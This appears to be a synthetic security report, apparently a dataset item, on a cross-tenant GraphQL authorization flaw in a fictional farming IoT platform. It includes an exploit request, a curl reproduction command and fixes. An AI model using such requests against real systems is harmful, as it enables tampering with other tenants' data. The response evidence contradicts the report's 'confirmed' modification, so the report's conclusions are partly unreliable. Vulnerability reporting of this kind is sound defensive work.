# Security Analysis Report
**System:** HarvestIQ IoT Platform
**Domain:** Agriculture / Precision Farming
**Example ID:** GQL-0322
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Integrity — Pattern 4.2 | Persistence poisoning via `updateResource` — attacker overwrites victim's precision-farming IoT record ownership and status across tenant boundaries |

---

## Finding 1 — Integrity: Persistence Poisoning via Lifecycle Actions (Pattern 4.2)

### Summary
The `updateResource` mutation on HarvestIQ IoT Platform (`api.harvestiq-iot-platfo.example.com`) does not validate whether the resource being mutated belongs to the caller's tenant. Per §5.0 Pattern 4.2, a lifecycle mutation (`updateResource`) is weaponised to poison a victim tenant's record: an attacker with `tenant-12cc` credentials sends a mutation against resource `R-2322` (belonging to `tenant-81b0`), forcibly overwriting its `status` to `approved` and reassigning its `ownerId` to `attacker-12cc81b0`. This is persistence poisoning — not merely data disclosure, but durable state corruption of a cross-tenant IoT resource.

**Context.txt inconsistency (documented):** HAR mutation body uses `updateResource(id: "R-2322", ...)`, but the response JSON key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`updateResource`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of IoT telemetry records.

**Pattern:** 4.2 — Persistence poisoning via lifecycle actions (Integrity)
**Affected resolver:** `updateResource`
**Affected endpoint:** `POST https://api.harvestiq-iot-platfo.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.harvestiq-iot-platfo.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-12cc

{"query": "query VulnerableOp { updateResource(id: \"R-2322\", input: {status: \"approved\", ownerId: \"attacker-12cc81b0\"}) { resourceId status } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Agriculture IoT Record Modified (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-81b0",
      "ownerId": "other-user-12cc81b0",
      "data": {
        "sensitiveField": "CONFIDENTIAL-12cc81b0",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-12cc`. Mutated record belongs to: `tenant-81b0`. Cross-tenant persistence poisoning confirmed: victim's resource `R-2322` status set to `approved` and `ownerId` overwritten with attacker value.

**Context.txt inconsistency:** HAR sends `updateResource` mutation; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.harvestiq-iot-platfo.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-12cc" \
  -d '{"query": "query VulnerableOp { updateResource(id: \"R-2322\", input: {status: \"approved\", ownerId: \"attacker-12cc81b0\"}) { resourceId status } }"}'
# Vulnerable: resource R-2322 (tenant-81b0) is mutated — status set to "approved", ownerId overwritten
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `updateResource` resolver: after fetching the record, verify that the record's `tenantId` matches the JWT's `tenantId` before applying any mutation.
2. Reject `ownerId` from client input — ownership must be immutable or set only by the server.
3. Re-key Redis cache to include `tenantId`.
